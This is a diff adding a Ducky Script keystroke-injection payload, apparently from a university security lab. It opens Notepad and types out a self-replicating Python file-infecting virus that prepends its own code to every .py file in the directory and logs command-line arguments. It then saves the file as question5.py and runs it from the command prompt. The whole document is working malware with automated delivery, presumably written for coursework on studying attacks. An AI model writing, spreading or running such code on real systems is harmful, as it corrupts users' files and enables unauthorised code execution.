@@ -1,0 +1,177 @@
+DELAY 1000
+REM open notepad
+GUI r
+DELAY 500
+STRING notepad.exe
+ENTER
+DELAY 1000
+STRING # virus start
+ENTER
+STRING import sys, glob
+ENTER
+STRING def file_finder(directory="."):
+ENTER
+TAB
+STRING return[file for file in glob.glob("*.py")]
+ENTER
+STRING def file_content(filename):
+ENTER
+TAB
+STRING info = None
+ENTER
+TAB
+STRING with open(filename, "r") as file:
+ENTER
+TAB
+TAB
+STRING info = file.readlines()
+ENTER
+TAB
+STRING return info
+ENTER
+STRING def infectable(filename):
+ENTER
+TAB
+STRING info = file_content(filename)
+ENTER
+TAB
+STRING for line in info:
+ENTER
+TAB
+TAB
+STRING if "# virus start\n" in line:
+ENTER
+TAB
+TAB
+TAB
+STRING return None
+ENTER
+TAB
+STRING return info
+ENTER
+STRING def virus_infect(filename, code):
+ENTER
+TAB
+STRING if (data:=infectable(filename)):
+ENTER
+TAB
+TAB
+STRING with open(filename, "w") as infect_file:
+ENTER
+TAB
+TAB
+TAB
+STRING infect_file.write("".join(code))
+ENTER
+TAB
+TAB
+TAB
+STRING infect_file.writelines(data)
+ENTER
+STRING def code():
+ENTER
+TAB
+STRING extract = False
+ENTER
+TAB
+STRING virus = []
+ENTER
+TAB
+STRING text = file_content(__file__)
+ENTER
+TAB
+STRING for line in text:
+ENTER
+TAB
+TAB
+STRING if "# virus start\n" in line:
+ENTER
+TAB
+TAB
+TAB
+STRING extract = True
+ENTER
+TAB
+TAB
+STRING if extract:
+ENTER
+TAB
+TAB
+TAB
+STRING virus.append(line)
+ENTER
+TAB
+TAB
+STRING if "# virus end\n" in line:
+ENTER
+TAB
+TAB
+TAB
+STRING extract = False
+ENTER
+TAB
+TAB
+TAB
+STRING break
+ENTER
+TAB
+STRING return virus
+ENTER
+STRING def append_file(line):
+ENTER
+TAB
+STRING output = "Q1C.out"
+ENTER
+TAB
+STRING with open(output, 'a') as x:
+ENTER
+TAB
+TAB
+STRING x.write(line + '\n')
+ENTER
+STRING def infection():
+ENTER
+TAB
+STRING line = " ".join(sys.argv)
+ENTER
+TAB
+STRING append_file(line)
+ENTER
+TAB
+STRING c = code()
+ENTER
+TAB
+STRING for files in file_finder():
+ENTER
+TAB
+TAB
+STRING virus_infect(files, c)
+ENTER
+STRING if __name__ == "__main__":
+ENTER
+TAB
+STRING infection()
+ENTER
+STRING # virus end
+DELAY 3000
+REM save file
+CTRL s
+DELAY 2000
+STRING question5.py
+ENTER
+CTRL s
+ENTER
+DELAY 3000
+CTRL w
+GUI r
+DELAY 2000
+STRING cmd
+ENTER
+DELAY 2000
+STRING cd C:\Users\varsh\Fall2023\CSE3140\lab2\WorkingPrototype
+DELAY 2000
+ENTER
+DELAY 3000
+STRING python question5.py
+DELAY 1000
+ENTER
